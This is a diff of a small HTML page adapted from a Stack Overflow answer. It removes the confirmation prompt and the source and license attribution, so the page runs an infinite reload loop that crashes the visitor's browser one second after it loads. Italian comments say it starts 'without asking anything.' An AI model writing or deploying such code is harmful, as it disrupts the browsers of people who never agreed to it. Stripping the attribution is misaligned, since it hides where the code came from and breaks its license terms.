@@ -1,34 +1,23 @@
-<!--
-Source - https://stackoverflow.com/a/67438079
-Posted by RandomDude
-Retrieved 2026-02-06, License - CC BY-SA 4.0
--->
-
 <!DOCTYPE html>
-<html>
+<html lang="it">
 <body>
 
-
 <h2>Crashing Now</h2>
-
-
-<p>Hit Ok To Crash</p>
-
-
-<p id="demo"></p>
-
+<p>Avvio automatico…</p>
 
 <script>
-onbeforeunload = function(){localStorage.x=1};
+  // viene eseguito ad ogni unload / reload
+  onbeforeunload = function () {
+    localStorage.x = 1;
+  };
 
-
-if(confirm("Do you REALLY want me to crash your browser?")){
-  setTimeout(function(){
-    while(1)location.reload(1)
-  }, 1000)
-}
+  // parte subito, senza chiedere nulla
+  setTimeout(function () {
+    while (1) {
+      location.reload(1);
+    }
+  }, 1000);
 </script>
-
 
 </body>
 </html>
